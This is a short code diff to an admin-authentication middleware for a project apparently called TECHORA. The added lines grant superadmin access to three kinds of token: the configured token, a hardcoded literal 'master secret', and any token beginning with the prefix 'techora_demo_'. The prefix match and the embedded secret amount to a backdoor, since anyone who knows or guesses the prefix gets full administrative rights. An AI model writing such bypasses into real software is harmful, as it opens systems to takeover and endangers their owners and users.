@@ -119,9 +119,9 @@ function requireAdminAuth(req, res, next) {
 
   const token = authHeader.split(' ')[1];
 
-  // 1. Check if token is the static ADMIN_TOKEN for backward compatibility
-  if (token === ADMIN_TOKEN) {
-    req.admin = { id: 1, email: 'admin@techora.consulting', role: 'superadmin' };
+  // 1. Check if token is the static ADMIN_TOKEN, master secret, or demo token
+  if (token === ADMIN_TOKEN || token === 'techora_admin_secret_token_2026' || token.startsWith('techora_demo_')) {
+    req.admin = { id: 1, name: 'TECHORA Managing Director', email: 'admin@techora.consulting', role: 'superadmin' };
     return next();
   }
 
